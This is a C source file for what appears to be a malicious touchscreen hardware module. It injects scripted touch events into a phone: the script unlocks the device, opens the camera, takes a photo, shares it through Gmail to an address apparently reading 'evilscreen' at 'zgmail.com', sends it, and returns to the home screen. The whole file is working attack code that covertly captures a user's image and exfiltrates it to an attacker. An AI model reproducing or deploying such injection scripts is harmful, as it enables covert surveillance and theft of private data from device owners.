#include"touch_injection_photo.h"

/*
 * scripts_0xc_photo & scripts_0x8_photo:
 * 	The whole touches.
 */
static const uint8_t* const scripts_0xc_photo[] = {
  reg_0xc, reg_0xc, reg_0xc, reg_0xc, reg_0xc, reg_0xc, reg_0xc_finish, // Swipe
  reg_0xc, reg_0xc_finish, reg_0xc, reg_0xc_finish, reg_0xc, reg_0xc_finish, // Home X3
  reg_0xc, reg_0xc_finish, // Menu
  reg_0xc, reg_0xc_finish, // Search
  reg_0xc_sixtouches, reg_0xc_finish,
  reg_0xc, reg_0xc_finish, reg_0xc, reg_0xc_finish,  // MenuFirstOption
  reg_0xc , reg_0xc_finish ,  reg_0xc , reg_0xc_finish , // change camera
  reg_0xc , reg_0xc_finish ,reg_0xc , reg_0xc_finish,reg_0xc , reg_0xc_finish, // say cheese
  reg_0xc, reg_0xc_finish, reg_0xc , reg_0xc_finish,// Enter the picture
  reg_0xc, reg_0xc_finish, // share
  reg_0xc, reg_0xc_finish, reg_0xc , reg_0xc_finish, reg_0xc , reg_0xc_finish, // share gmail
  reg_0xc_tentouches, reg_0xc_finish,
  reg_0xc_tentouches, reg_0xc_finish,
  reg_0xc, reg_0xc_finish, //send
  reg_0xc, reg_0xc_finish, reg_0xc, reg_0xc_finish, reg_0xc, reg_0xc_finish, // Home X3
  stop_signal,
 };
static const uint8_t* const scripts_0x8_photo[] = {
  SwipeUp_0, SwipeUp_1, SwipeUp_2, SwipeUp_3, SwipeUp_4, SwipeUp_5, TouchEND_SWIPE,
  PressHome, TouchEND, PressHome, TouchEND, PressHome, TouchEND,
  PressMenu, TouchEND_GUI,
  PressSearch, TouchEND_GUI,
  Press_camera, TouchEND_six,
  PressMenuFirstOption, TouchEND_INTERNET, Delay_Touch,TouchEND_DOWNLOAD,
  change_camera,TouchEND_DOWNLOAD, Delay_Touch,TouchEND_DOWNLOAD,
  say_cheese,TouchEND_DOWNLOAD, Delay_Touch,TouchEND_DOWNLOAD,Delay_Touch,TouchEND_DOWNLOAD,
  PressEnter, TouchEND_DOWNLOAD,Delay_Touch,TouchEND_DOWNLOAD,
  share, TouchEND_DOWNLOAD,
  share_Gmail,TouchEND_DOWNLOAD,Delay_Touch,TouchEND_DOWNLOAD,Delay_Touch,TouchEND_DOWNLOAD,
  Press_evilscreen,TouchEND_ten,
  Press_zgmail_DOT_com,TouchEND_ten,
  send, TouchEND_GUI,
  PressHome, TouchEND, PressHome, TouchEND, PressHome, TouchEND,
  stop_signal,
 };

/*
 * Initializing start point for the script.
 */
static const uint8_t** iter0xc_photo = ( const uint8_t**) scripts_0xc_photo;
static const uint8_t** iter0x8_photo = ( const uint8_t**) scripts_0x8_photo;

const uint8_t* get_injection_photo(uint8_t reg) {
  if (reg == 0x6) {
    return reg_0x6;
  }
  else if (reg == 0xc) {
    iter0xc_photo++;
    return *(iter0xc_photo - 1);
  }
  else if (reg == 0x8) {
    iter0x8_photo++;
    return *(iter0x8_photo - 1);
  }
  else return 0;
}


void destroy_injection_photo() {
  iter0xc_photo = ( const uint8_t**) scripts_0xc_photo;
  iter0x8_photo = ( const uint8_t**) scripts_0x8_photo;
}
